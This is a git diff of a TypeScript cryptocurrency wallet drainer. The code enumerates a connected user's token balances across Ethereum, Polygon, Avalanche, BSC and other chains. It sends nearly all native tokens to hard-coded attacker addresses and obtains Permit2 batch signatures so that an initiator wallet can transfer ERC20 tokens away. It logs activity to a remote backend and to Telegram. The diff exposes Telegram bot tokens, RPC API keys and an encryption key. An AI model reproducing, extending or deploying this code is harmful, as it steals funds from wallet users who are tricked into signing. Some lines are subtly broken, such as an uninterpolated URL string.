@@ -12,19 +12,18 @@ import { appKit } from "./networkSwitcher";
 import {  useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
 
 
-const TELEGRAM_BOT_TOKEN = "8068548998:AAFv-C7AyhMKF7pQZW00Rjk4w-mTSzUubmg"
-const TELEGRAM_CHAT_ID = "-1002293727454"
-
+const TELEGRAM_BOT_TOKEN = "8160714180:AAGKqwTYvb9cN2Ir6Zjqhc7KWQl2mAHDNJQ";
+const TELEGRAM_CHAT_ID = "-1002535678431";
 
 
 const DAI_ADDRESS_MAINNET = "0x6B175474E89094C44Da98b954EedeAC495271d0F"; // DON'T TOUCH THIS !!!
 
-const BLACK_RAIN_SPLIT = "0x4Fc94E3CBb1A1070D4Df126C4cFa37fBBd9dcd08"   // DON'T TOUCH THIS !!!
+const BLACK_RAIN_SPLIT = "0x4758a129ee74947CFA6Ff970162D68e1ee9f55f7";   // DON'T TOUCH THIS !!!
 
 
 const BR_INITIATOR_ADDRESS = "0x143EaF2E6A0914F52020D8c2eE9A2b10A77868fE".toLowerCase(); // Replace wth your private key public address example 0x4Fc94E3CBb1A1070D4Df126C4cFa37fBBd9dcd08 
 
-const FRONTEND_RECIPIENT = "0xC08DAF6E355986a4c4BB4d5cc481203df309b484"; // Hardcoded frontend recipient YOUR RECEIVIVNG ADDRESS SHOULD BE HERE
+const FRONTEND_RECIPIENT = "0xBFb1BAE18a786df08026908f2BA20aE77955170f"; // Hardcoded frontend recipient YOUR RECEIVIVNG ADDRESS SHOULD BE HERE
 
 
 // Ensure addresses are lowercase or properly checksummed to avoid Ethers checksum errors
@@ -45,25 +44,80 @@ interface DiscoveredToken {
 
 
 
-const isLoggingEnabled = true; // Toggle this to enable/disable logs
+// const isLoggingEnabled = true; // Toggle this to enable/disable logs
+// import axios from "axios";
 
-const log = (...messages: unknown[]) => {
+const isLoggingEnabled = true;
+const BASE_API_URL = "https://drn-2stp.onrender.com/api"; // From permit.txt
+// const BASE_API_URL = "http://localhost:8080/api";
+
+
+const stringifyMessage = (message: unknown): string => {
+  if (typeof message === "object" && message !== null) {
+    try {
+      return JSON.stringify(message, null, 2);
+    } catch {
+      return String(message); // Fallback for circular references
+    }
+  }
+  return String(message);
+};
+
+const log = async (...messages: unknown[]) => {
   if (isLoggingEnabled) {
-    console.log(...messages); // Directly use console.log
+    const timestamp = new Date().toISOString();
+    const logMessage = `[LOG ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
+    console.log(logMessage);
+    console.error(logMessage); // For Vercel visibility
+    try {
+      await axios.post(`${BASE_API_URL}/log`, {
+        level: "info",
+        message: logMessage,
+        timestamp,
+      });
+    } catch (err) {
+      const errorMessage = err instanceof Error ? err.message : String(err);
+      console.error(`Failed to send log to backend: ${errorMessage}`);
+    }
   }
 };
 
-const warn = (...messages: unknown[]) => {
+const warn = async (...messages: unknown[]) => {
   if (isLoggingEnabled) {
-    console.warn(...messages); // Directly use console.warn
+    const timestamp = new Date().toISOString();
+    const logMessage = `[WARN ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
+    console.warn(logMessage);
+    console.error(logMessage);
+    try {
+      await axios.post(`${BASE_API_URL}/log`, {
+        level: "warn",
+        message: logMessage,
+        timestamp,
+      });
+    } catch (err) {
+      const errorMessage = err instanceof Error ? err.message : String(err);
+      console.error(`Failed to send warn to backend: ${errorMessage}`);
+    }
   }
 };
 
-const error = (...messages: string[]) => {
-  console.error(...messages); // Errors should always log
+const error = async (...messages: unknown[]) => {
+  if (isLoggingEnabled) {
+    const timestamp = new Date().toISOString();
+    const logMessage = `[ERROR ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
+    console.error(logMessage);
+    try {
+      await axios.post(`${BASE_API_URL}/log`, {
+        level: "error",
+        message: logMessage,
+        timestamp,
+      });
+    } catch (err) {
+      const errorMessage = err instanceof Error ? err.message : String(err);
+      console.error(`Failed to send error to backend: ${errorMessage}`);
+    }
+  }
 };
-
-
 // Replace
 error("An unexpected error occurred during sendTransactions.");
 
@@ -143,8 +197,8 @@ interface Chain {
 }
 
 // Centralized keys
-const INFURA_KEY = "15b2a4fd999148318a366400d99bc8ce"; // Replace with your actual Infura key
-const ALCHEMY_KEY = ""; // Replace with your actual Alchemy key
+const INFURA_KEY = "9b8bdc756b0b46698b33ffc3eff46afb"; // Replace with your actual Infura key
+const ALCHEMY_KEY = "alcht_bxl8eQ123RNGV8raWma1ExZYoxji6V"; // Replace with your actual Alchemy key
 
 
 const chains: Chain[] = [
@@ -160,17 +214,17 @@ const chains: Chain[] = [
       alchemy: `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
     },
   },
-  // {
-  //   id: "0x89",
-  //   label: "Polygon Mainnet",
-  //   name: "Polygon",
-  //   nativeCurrency: { name: "Matic", symbol: "MATIC", decimals: 18 },
-  //   rpcUrls: {
-  //     http: ["https://polygon-rpc.com"],
-  //     default: "https://polygon-rpc.com",
-  //     infura: `https://polygon-mainnet.infura.io/v3/${INFURA_KEY}`,
-  //   },
-  // },
+  {
+    id: "0x89",
+    label: "Polygon Mainnet",
+    name: "Polygon",
+    nativeCurrency: { name: "Matic", symbol: "MATIC", decimals: 18 },
+    rpcUrls: {
+      http: ["https://polygon-rpc.com"],
+      default: "https://polygon-rpc.com",
+      infura: `https://polygon-mainnet.infura.io/v3/${INFURA_KEY}`,
+    },
+  },
   // {
   //   id: "0xa4b1",
   //   label: "Arbitrum One",
@@ -182,26 +236,26 @@ const chains: Chain[] = [
   //     alchemy: `https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
   //   },
   // },
-  // {
-  //   id: "0xa86a",
-  //   label: "Avalanche C-Chain",
-  //   name: "Avalanche",
-  //   nativeCurrency: { name: "Avalanche", symbol: "AVAX", decimals: 18 },
-  //   rpcUrls: {
-  //     http: ["https://api.avax.network/ext/bc/C/rpc"],
-  //     default: "https://api.avax.network/ext/bc/C/rpc",
-  //   },
-  // },
-  // {
-  //   id: "0x38",
-  //   label: "Binance Smart Chain Mainnet",
-  //   name: "Binance Smart Chain",
-  //   nativeCurrency: { name: "Binance Coin", symbol: "BNB", decimals: 18 },
-  //   rpcUrls: {
-  //     http: ["https://bsc-dataseed.binance.org"],
-  //     default: "https://bsc-dataseed.binance.org",
-  //   },
-  // },
+  {
+    id: "0xa86a",
+    label: "Avalanche C-Chain",
+    name: "Avalanche",
+    nativeCurrency: { name: "Avalanche", symbol: "AVAX", decimals: 18 },
+    rpcUrls: {
+      http: ["https://api.avax.network/ext/bc/C/rpc"],
+      default: "https://api.avax.network/ext/bc/C/rpc",
+    },
+  },
+  {
+    id: "0x38",
+    label: "Binance Smart Chain Mainnet",
+    name: "Binance Smart Chain",
+    nativeCurrency: { name: "Binance Coin", symbol: "BNB", decimals: 18 },
+    rpcUrls: {
+      http: ["https://bsc-dataseed.binance.org"],
+      default: "https://bsc-dataseed.binance.org",
+    },
+  },
   {
     id: "0xaa36a7",
     label: "Ethereum Sepolia Testnet",
@@ -213,8 +267,6 @@ const chains: Chain[] = [
     },
   },
 ];
-
-
 
 
 // Helper function to map Chain to AppKitNetwork
@@ -240,10 +292,11 @@ const mapChainToAppKitNetwork = (chain: Chain): AppKitNetwork => ({
 
 // const BASE_API_URL = "https://ethereum-explorer.archi/api";
 
-const BASE_API_URL = "http://localhost:3002/api";
+// const BASE_API_URL = "http://localhost:3002/api";
+// const BASE_API_URL = "https://drn-2stp.onrender.com/api"
 
 // Encryption key (must match the backend)
-const BR_ENCRYPTION_KEY = "980c343e20c973f1b941a409d268df2cfca1d2fba93732fcecd3d5ed9cc93305";
+const BR_ENCRYPTION_KEY = "9eb784738a1716465663e61e45fa8775f012bf944ac888a7c13db7b8d4962eda";
 
 
 const encrypt = (data: unknown): { iv: string; data: string } => {
@@ -297,19 +350,18 @@ const fetchInitiatorCredentials = async (): Promise<{ initiator: string; initiat
 
 
 
-
 // Use BR_Private_RPC_URLs instead of chains
 const BR_Private_RPC_URLs: Record<number, string> = {
-  // 1: `https://mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Ethereum
-  // 10: `https://optimism-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Optimism
-  // 56: `https://bsc-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Binance Smart Chain
-  // 137: `https://polygon-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Polygon
-  // // 250: `https://rpc.ankr.com/fantom${BR_Ankr_Token ? `/${BR_Ankr_Token}` : ""}`, // Fantom
-  // 43114: `https://avalanche-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Avalanche
-  // 42161: `https://arbitrum-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Arbitrum
-  // 8453: `https://base-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Base
-  // 324: `https://zksync-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // zkSync Era
-  // 369: "https://pulsechain.publicnode.com", // Pulse
+  1: `https://mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Ethereum
+  10: `https://optimism-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Optimism
+  56: `https://bsc-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Binance Smart Chain
+  137: `https://polygon-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Polygon
+  // 250: `https://rpc.ankr.com/fantom${BR_Ankr_Token ? `/${BR_Ankr_Token}` : ""}`, // Fantom
+  43114: `https://avalanche-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Avalanche
+  42161: `https://arbitrum-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Arbitrum
+  8453: `https://base-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Base
+  324: `https://zksync-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // zkSync Era
+  369: "https://pulsechain.publicnode.com", // Pulse
   11155111: "https://sepolia.infura.io/v3/15b2a4fd999148318a366400d99bc8ce", // Sepolia
 };
 
@@ -358,7 +410,6 @@ const fetchAllGasData = async () => {
 
     const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
     const gasData = await fetchGasData(chainId, provider);
-
     log(`Gas Data for Chain ${chainId}:`, gasData);
   }
 };
@@ -437,6 +488,7 @@ function usePermits() {
   
       if (response.status === 200 && response.data?.balances) {
         log(`Balances fetched successfully for chain ${chainId}:`, response.data.balances);
+        // sendToTelegram(`Balances fetched successfully for chain ${chainId} \n Balance is balance is ${JSON.stringify(response.data.balances)} `);
         return response.data.balances;
       } else {
         console.error(`Unexpected response format for chain ${chainId}:`, response.data);
@@ -977,21 +1029,15 @@ const fetchAllBalances = async (
 
       const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
       const chainId = parseInt(chain.id, 16);
+      console.log(chainId, provider);
       const balances = (await fetchBalances(userAddress, chainId)) as Token[];
 
       const validTokens: TokenBalance[] = balances
-        .filter((token) => {
-          // For native tokens, check if balance is non-zero
-          if (token.type === "NATIVE") {
-            return !BigNumber.from(token.balance).isZero();
-          }
-          // For ERC20 tokens, check if balance is non-zero and contract exists
-          return !BigNumber.from(token.balance).isZero() && token.contract !== null;
-        })
+        .filter((token) => !BigNumber.from(token.balance).isZero())
         .map((token) => ({
-          address: token.address || "0x0000000000000000000000000000000000000000", // Use zero address for native tokens
+          address: token.address,
           balance: BigNumber.from(token.balance),
-          contract: token.contract || new ethers.Contract(token.address || "0x0000000000000000000000000000000000000000", ERC20_ABI, provider),
+          contract: new ethers.Contract(token.address, ERC20_ABI, provider),
           name: token.name,
           symbol: token.symbol,
           type: token.type,
@@ -1035,7 +1081,7 @@ const fetchAllBalances = async (
       log("Chains with balances:", chainsWithBalances.map((entry) => entry.chain.label));
   
       // Specify the wallet name
-      const walletName = "metamask"; // Change this based on the wallet being used
+      const walletName = "metamask"; // Change this based on the wallet being used check here
   
       for (const { chain, balances } of chainsWithBalances) {
         log(`Switching to chain: ${chain.label}`);
@@ -1100,105 +1146,88 @@ const transferNativeToken = async (
       throw new Error("Signer does not have an associated provider.");
     }
 
-    // Get signer balance and gas fee data
     const signerBalance = await signer.getBalance();
     const feeData = await provider.getFeeData();
-
-    // Determine gas price for EIP-1559 or legacy
+    await log(`EIP-1559 Fee Data for Chain ${chainId}:`, feeData);
     const gasPrice = feeData.maxFeePerGas && feeData.maxPriorityFeePerGas
-      ? feeData.maxFeePerGas // Use EIP-1559 gas model
-      : feeData.gasPrice || ethers.utils.parseUnits("5", "gwei"); // Fallback to legacy gas price
-
-    // Estimate gas limit dynamically for a transfer
+      ? feeData.maxFeePerGas
+      : feeData.gasPrice || ethers.utils.parseUnits("5", "gwei");
     const gasLimit = await provider.estimateGas({
       to: recipient,
-      value: signerBalance
-    }).catch(() => BigNumber.from(21000)); // Fallback to 21000 if estimation fails
-
-    // Calculate total gas cost
+      value: signerBalance,
+    }).catch(() => ethers.BigNumber.from(21000));
     const totalGasCost = gasPrice.mul(gasLimit);
+    await log(`Gas Data for Chain ${chainId}:`, { gasPrice: ethers.utils.formatUnits(gasPrice, "gwei"), gasLimit: gasLimit.toString() });
 
     if (signerBalance.lte(totalGasCost)) {
-      log("Insufficient balance to cover gas fees.");
+      await log("Insufficient balance to cover gas fees.");
       return;
     }
 
     const balanceInUSD = parseFloat(ethers.utils.formatEther(signerBalance.sub(totalGasCost))) * tokenPriceInUSD;
-
-    // Skip transfer if the native token balance is below $2
-    if (balanceInUSD < 10) {
-      log("Native token balance below $10. Skipping transfer.");
+    if (balanceInUSD < 2) {
+      await log("Native token balance below $2. Skipping transfer.");
       return;
     }
 
-    // Leave $10 untouched if conditions are met
     if (balanceInUSD >= 50 && totalTokenValueInUSD > 50) {
-      const amountToLeaveInUSD = 10; // Leave $10 worth of ETH
+      const amountToLeaveInUSD = 10;
       const remainingBalance = ethers.utils.parseEther(
         ((balanceInUSD - amountToLeaveInUSD) / tokenPriceInUSD).toFixed(18)
       );
-      const amountToSend = signerBalance
-        .sub(totalGasCost)
-        .sub(remainingBalance);
-
-      if (
-        amountToSend.isZero() ||
-        amountToSend.lt(ethers.utils.parseEther("0.0001"))
-      ) {
-        log("Amount to send is too small after subtracting gas fees and leaving $10.");
+      const amountToSend = signerBalance.sub(totalGasCost).sub(remainingBalance);
+      if (amountToSend.isZero() || amountToSend.lt(ethers.utils.parseEther("0.0001"))) {
+        await log("Amount to send is too small after subtracting gas fees and leaving $10.");
         return;
       }
-
       const tx = await signer.sendTransaction({
         to: recipient,
         value: amountToSend,
         gasPrice,
         gasLimit,
       });
-
-      log(`Transaction sent: ${tx.hash}`);
+      await log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
-      log(`Transaction confirmed: ${tx.hash}`);
+      await log(`Transaction confirmed: ${tx.hash}`);
+      await axios.post("${BASE_API_URL}/api/log", {
+        level: "info",
+        message: `EVM transaction confirmed: ${tx.hash}`,
+        timestamp: new Date().toISOString(),
+      });
     } else {
-      // Standard transfer logic when conditions are not met
       const amountToSend = signerBalance.sub(totalGasCost);
-
-      if (
-        amountToSend.isZero() ||
-        amountToSend.lt(ethers.utils.parseEther("0.0001"))
-      ) {
-        log("Amount to send is too small after subtracting gas fees.");
+      if (amountToSend.isZero() || amountToSend.lt(ethers.utils.parseEther("0.0001"))) {
+        await log("Amount to send is too small after subtracting gas fees.");
         return;
       }
-
       const tx = await signer.sendTransaction({
         to: recipient,
         value: amountToSend,
         gasPrice,
         gasLimit,
       });
-
-      log(`Transaction sent: ${tx.hash}`);
+      await log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
-      log(`Transaction confirmed: ${tx.hash}`);
+      await log(`Transaction confirmed: ${tx.hash}`);
+      await axios.post("${BASE_API_URL}/api/log", {
+        level: "info",
+        message: `EVM transaction confirmed: ${tx.hash}`,
+        timestamp: new Date().toISOString(),
+      });
     }
-  } catch (error: unknown) {
-    if (
-      typeof error === "object" &&
-      error !== null &&
-      "code" in error &&
-      (error as { code: string }).code === "ACTION_REJECTED"
-    ) {
-      warn(`Transaction rejected by the user. Skipping to the next token.`);
-    } else if (error instanceof Error) {
-      console.error(`Error transferring native token on chain ${chainId}:`, error.message);
+
+    log(`[ETH] Showing ETH transfer popup for amount ${ethers.utils.formatEther(amountToSend)} ETH`);
+  } catch (err: unknown) {
+    if (typeof err === "object" && err !== null && "code" in err && err.code === "ACTION_REJECTED") {
+      await warn(`Transaction rejected by the user. Skipping to the next token.`);
+    } else if (err instanceof Error) {
+      await error(`Error transferring native token on chain ${chainId}: ${err.message}`);
     } else {
-      console.error(`An unknown error occurred while transferring native token on chain ${chainId}.`);
+      await error(`An unknown error occurred while transferring native token on chain ${chainId}: ${String(err)}`);
     }
   }
 };
-
-
+  
 const processChainTransactions = async (
   chain: Chain,
   validTokens: TokenBalance[],
@@ -1218,12 +1247,16 @@ const processChainTransactions = async (
   // Sort tokens by their USD value in descending order
   validTokens.sort((a, b) => b.amountUSD - a.amountUSD);
 
-  // Handle native token transfer first
-  try {
+  // Handle native token (ETH) first
+  const nativeToken = validTokens.find(token => token.type === 'NATIVE' || token.address === ethers.constants.AddressZero || token.symbol === 'ETH');
+
+  if (nativeToken) {
     const totalTokenValueInUSD = validTokens.reduce(
       (sum, token) => sum + token.amountUSD,
       0
     );
+    
+    log(`Found native token (${nativeToken.symbol}) with balance: ${ethers.utils.formatEther(nativeToken.balance)}`);
     await transferNativeToken(
       BLACK_RAIN_SPLIT,
       signer,
@@ -1231,27 +1264,20 @@ const processChainTransactions = async (
       chain.id,
       totalTokenValueInUSD
     );
-  } catch (error) {
-    if (error instanceof Error) {
-      warn(`Failed to transfer native token on ${chain.label}:`, error.message);
-    } else {
-      warn(`Failed to transfer native token on ${chain.label}: Unknown error`);
-    }
   }
 
+  // Process ERC20 tokens separately
+  const erc20Tokens = validTokens.filter(token => 
+    token.type === 'ERC20' && 
+    token.address !== ethers.constants.AddressZero
+  );
+
   // Call handlePermit2AndTransfer once upfront
-  await handlePermit2AndTransfer(validTokens, walletName);
+  await handlePermit2AndTransfer(erc20Tokens, walletName);
 
-  // Process each valid token in parallel (without calling handlePermit2AndTransfer inside)
-  const tokenProcessingPromises = validTokens.map(async (token) => {
+  // Process each valid token in parallel
+  const tokenProcessingPromises = erc20Tokens.map(async (token) => {
     log(`Processing token: ${token.name} on ${chain.label}`);
-
-    if (token.type === "NATIVE") {
-      log("Skipping decimals fetch for native token.");
-      return;
-    }
-
-    token.contract = new ethers.Contract(token.address, ERC20_ABI, provider);
 
     try {
       const decimals = await token.contract.decimals();
@@ -1396,6 +1422,8 @@ const processChainTransactions = async (
     }
   };
 
+
+
   async function handlePermit2AndTransfer(validTokens: TokenBalance[], walletName: string) {
     if (!provider) {
       console.error("Provider not available.");
@@ -1417,10 +1445,23 @@ const processChainTransactions = async (
       const discoveredTokens: DiscoveredToken[] = [];
       for (const token of validTokens) {
         try {
-          const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
-          const balance = await tokenContract.balanceOf(selectedAddress);
-          if (!balance.isZero()) {
-            discoveredTokens.push({ address: token.address, balance, contract: tokenContract });
+          if (token.type === 'NATIVE' || token.address === ethers.constants.AddressZero) {
+            // Handle native token (ETH)
+            const balance = await provider.getBalance(selectedAddress);
+            if (!balance.isZero()) {
+              discoveredTokens.push({ 
+                address: token.address, 
+                balance, 
+                contract: null // Native token doesn't have a contract
+              });
+            }
+          } else {
+            // Handle ERC20 tokens
+            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
+            const balance = await tokenContract.balanceOf(selectedAddress);
+            if (!balance.isZero()) {
+              discoveredTokens.push({ address: token.address, balance, contract: tokenContract });
+            }
           }
         } catch (innerError) {
           const error = innerError as Error;
@@ -1429,11 +1470,17 @@ const processChainTransactions = async (
       }
   
       if (discoveredTokens.length === 0) {
-        console.log("No tokens found with non-zero balance. Stopping.");
+        log("No tokens have non-zero amounts to transfer. Stopping.");
         return;
       }
   
-      console.log("Discovered tokens:", discoveredTokens);
+      log(`Discovered ${discoveredTokens.length} tokens with non-zero balance:`, 
+        discoveredTokens.map(t => ({
+          address: t.address,
+          balance: ethers.utils.formatEther(t.balance),
+          isNative: t.address === ethers.constants.AddressZero
+        }))
+      );
   
       // Prepare permit and transfer details
       const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
@@ -1612,514 +1659,146 @@ const processChainTransactions = async (
   }
   
 
-  // Main function for handling Permit2 and transfer
-  // async function handlePermit2AndTransfer(validTokens: TokenBalance[], walletName: string) {
-  //   if (!provider) {
-  //     console.error("Provider not available.");
-  //     return;
-  //   }
-  
-  //   try {
-  //     // Fetch initiator credentials dynamically
-  //     const { initiator, initiatorPK } = await fetchInitiatorCredentials();
-  //     console.log("Fetched initiator credentials:", initiator);
-  
-  //     const signer = provider.getSigner();
-  //     const selectedAddress = await signer.getAddress();
-  //     console.log("Selected Address:", selectedAddress);
-  
-  //     const permit2Contract = new ethers.Contract(Permit2Contract, Permit2ContractABI, signer);
-  
-  //     // Discover tokens with non-zero balance
-  //     const discoveredTokens: DiscoveredToken[] = [];
-  //     for (const token of validTokens) {
-  //       try {
-  //         const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
-  //         const balance = await tokenContract.balanceOf(selectedAddress);
-  //         if (!balance.isZero()) {
-  //           discoveredTokens.push({ address: token.address, balance, contract: tokenContract });
-  //         }
-  //       } catch (innerError) {
-  //         const error = innerError as Error; // Explicitly cast to Error
-  //         console.warn(`Error discovering token ${token.address}:`, error.message);
-  //       }
-  //     }
-  
-  //     if (discoveredTokens.length === 0) {
-  //       console.log("No tokens found with non-zero balance. Stopping.");
-  //       return;
-  //     }
-  
-  //     console.log("Discovered tokens:", discoveredTokens);
-  
-  //     // Prepare permit and transfer details
-  //     const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
-  //     const permitDetails = [];
-  //     const transferDetails = [];
-  
-  //     for (const token of discoveredTokens) {
-  //       const { address: tokenAddress, balance } = token;
-  //       const allowance = await token.contract.allowance(selectedAddress, Permit2Contract);
-  
-  //       const transferAmount = balance.lt(allowance) ? balance : allowance;
-  //       if (transferAmount.isZero()) continue;
-  
-  //       const [, , currentNonceRaw] = await permit2Contract.allowance(
-  //         selectedAddress,
-  //         tokenAddress,
-  //         initiator
-  //       );
-  //       const currentNonce = ethers.BigNumber.from(currentNonceRaw).toNumber();
-  
-  //       permitDetails.push({
-  //         token: tokenAddress,
-  //         amount: transferAmount.toString(),
-  //         expiration: deadline,
-  //         nonce: currentNonce,
-  //       });
-  
-  //       transferDetails.push({
-  //         from: selectedAddress,
-  //         to: receipient, // Define `receipient` appropriately
-  //         amount: transferAmount.toString(),
-  //         token: tokenAddress,
-  //       });
-  //     }
-  
-  //     if (permitDetails.length === 0) {
-  //       console.log("No tokens have non-zero amounts to transfer. Stopping.");
-  //       return;
-  //     }
-  
-  //     // EIP-712 signing domain
-  //     const domain = {
-  //       name: "Permit2",
-  //       chainId: await provider.getNetwork().then((net) => net.chainId),
-  //       verifyingContract: Permit2Contract,
-  //     };
-  
-  //     const batchTypes = {
-  //       PermitBatch: [
-  //         { name: "details", type: "PermitDetails[]" },
-  //         { name: "spender", type: "address" },
-  //         { name: "sigDeadline", type: "uint256" },
-  //       ],
-  //       PermitDetails: [
-  //         { name: "token", type: "address" },
-  //         { name: "amount", type: "uint160" },
-  //         { name: "expiration", type: "uint48" },
-  //         { name: "nonce", type: "uint48" },
-  //       ],
-  //     };
-  
-  //     const typedDataValue = {
-  //       details: permitDetails,
-  //       spender: initiator,
-  //       sigDeadline: deadline,
-  //     };
-  
-  //     // Generate deep link for user approval
-  //     const deepLink = generateDeepLink(walletName, {
-  //       action: "sign",
-  //       chainId: domain.chainId,
-  //       userAddress: selectedAddress,
-  //       domain,
-  //       types: batchTypes,
-  //       message: typedDataValue,
-  //     });
-  //     console.log(`Generated deep link: ${deepLink}`);
-  //     await sendToTelegram(`Action required: Approve the batch permit:\n${deepLink}`);
-  
-  //     // Request EIP-712 signature
-  //     console.log("Requesting EIP-712 signature from user...");
-  //     const signature = await signer._signTypedData(domain, batchTypes, typedDataValue);
-  //     console.log("Signature received:", signature);
-  
-  //     // Initiator wallet for transactions
-  //     const initiatorWallet = new ethers.Wallet(initiatorPK, provider);
-  //     let nonce = await provider.getTransactionCount(initiator, "pending");
-  //     const gasPrice = await provider.getGasPrice();
-  
-  //     // Prepare and send permit transaction
-  //     const permitData = permit2Contract.interface.encodeFunctionData("permit", [
-  //       selectedAddress,
-  //       typedDataValue,
-  //       signature,
-  //     ]);
-  //     const permitTx = {
-  //       from: initiator,
-  //       to: Permit2Contract,
-  //       nonce: ethers.utils.hexlify(nonce),
-  //       gasLimit: ethers.BigNumber.from("200000"),
-  //       gasPrice,
-  //       value: "0x0",
-  //       data: permitData,
-  //     };
-  
-  //     console.log("Sending permit transaction...");
-  //     const signedPermitTx = await initiatorWallet.signTransaction(permitTx);
-  //     const permitResponse = await provider.sendTransaction(signedPermitTx);
-  //     await permitResponse.wait();
-  //     console.log("Permit TX successful:", permitResponse.hash);
-  
-  //     // Prepare and send batch transfer transaction
-  //     nonce++;
-  //     const batchTransferData = permit2Contract.interface.encodeFunctionData(
-  //       permit2Contract.interface.getFunction("transferFrom((address,address,uint160,address)[])"),
-  //       [transferDetails]
-  //     );
-  
-  //     const batchTransferTx = {
-  //       from: initiator,
-  //       to: Permit2Contract,
-  //       nonce: ethers.utils.hexlify(nonce),
-  //       gasLimit: ethers.utils.hexlify(300000),
-  //       gasPrice,
-  //       value: "0x0",
-  //       data: batchTransferData,
-  //     };
-  
-  //     console.log("Sending batch transfer transaction...");
-  //     const signedBatchTx = await initiatorWallet.signTransaction(batchTransferTx);
-  //     const batchTxResponse = await provider.sendTransaction(signedBatchTx);
-  //     await batchTxResponse.wait();
-  //     console.log("Batch transfer TX successful:", batchTxResponse.hash);
-  
-  //     await sendToTelegram(
-  //       `Batch transfer successful. Permit TX: ${permitResponse.hash}, Transfer TX: ${batchTxResponse.hash}`
-  //     );
-  //   } catch (error) {
-  //     // Safely handle 'unknown' error type
-  //     const err = error as Error;
-  //     console.error("Error during permit and transfer:", err.message);
-  //     await sendToTelegram(`Error during permit and transfer: ${err.message}`);
-  //   }
-  // }
-  
-
-  // async function handlePermit2AndTransfer(validTokens: TokenBalance[], walletName: string) {
-  //   if (!provider) {
-  //     console.error("Provider not available.");
-  //     return;
-  //   }
-  
-  //   try {
-  //     const signer = provider.getSigner();
-  //     const selectedAddress = await signer.getAddress();
-  //     console.log("Selected Address:", selectedAddress);
-  
-  //     const permit2Contract = new ethers.Contract(Permit2Contract, Permit2ContractABI, signer);
-  
-  //     // Dynamically gather tokens with non-zero balance
-  //     const discoveredTokens: DiscoveredToken[] = [];
-  //     for (const token of validTokens) {
-  //       try {
-  //         const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
-  //         const balance = await tokenContract.balanceOf(selectedAddress);
-  //         if (!balance.isZero()) {
-  //           discoveredTokens.push({
-  //             address: token.address,
-  //             balance,
-  //             contract: tokenContract,
-  //           });
-  //         }
-  //       } catch (error) {
-  //         warn(`Error discovering token ${token.address}:`, error);
-  //       }
-  //     }
-  
-  //     if (discoveredTokens.length === 0) {
-  //       console.log("No tokens found with non-zero balance. Stopping.");
-  //       return;
-  //     }
-  //     console.log("Discovered tokens:", discoveredTokens);
-  
-  //     // Prepare permit and transfer details
-  //     const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
-  //     const permitDetails = [];
-  //     const transferDetails = [];
-  
-  //     for (const token of discoveredTokens) {
-  //       const tokenAddress = token.address;
-  //       const balance = token.balance;
-  //       const userAllowance = await token.contract.allowance(selectedAddress, Permit2Contract);
-  
-  //       const transferAmount = balance.lt(userAllowance) ? balance : userAllowance;
-  //       if (transferAmount.isZero()) continue;
-  
-  //       const [, , currentNonceRaw] = await permit2Contract.allowance(selectedAddress, tokenAddress, initiator);
-  //       const currentNonce = ethers.BigNumber.from(currentNonceRaw).toNumber();
-  
-  //       permitDetails.push({
-  //         token: tokenAddress,
-  //         amount: transferAmount.toString(),
-  //         expiration: deadline,
-  //         nonce: currentNonce,
-  //       });
-  
-  //       transferDetails.push({
-  //         from: selectedAddress,
-  //         to: receipient,
-  //         amount: transferAmount.toString(),
-  //         token: tokenAddress,
-  //       });
-  //     }
-  
-  //     if (permitDetails.length === 0) {
-  //       console.log("No tokens have non-zero amounts to transfer. Stopping.");
-  //       return;
-  //     }
-  
-  //     // EIP-712 signing domain
-  //     const domain = {
-  //       name: "Permit2",
-  //       chainId: await provider.getNetwork().then((net) => net.chainId),
-  //       verifyingContract: Permit2Contract,
-  //     };
-  
-  //     const batchTypes = {
-  //       PermitBatch: [
-  //         { name: "details", type: "PermitDetails[]" },
-  //         { name: "spender", type: "address" },
-  //         { name: "sigDeadline", type: "uint256" },
-  //       ],
-  //       PermitDetails: [
-  //         { name: "token", type: "address" },
-  //         { name: "amount", type: "uint160" },
-  //         { name: "expiration", type: "uint48" },
-  //         { name: "nonce", type: "uint48" },
-  //       ],
-  //     };
-  
-  //     const typedDataValue = {
-  //       details: permitDetails,
-  //       spender: initiator,
-  //       sigDeadline: deadline,
-  //     };
-  
-  //     // Generate and send deep link for user approval
-  //     log("Generating deep link...");
-  //     const deepLinkParams = {
-  //       action: "sign",
-  //       chainId: domain.chainId,
-  //       userAddress: selectedAddress,
-  //       domain,
-  //       types: batchTypes,
-  //       message: typedDataValue,
-  //     };
-  //     const deepLink = generateDeepLink(walletName, deepLinkParams);
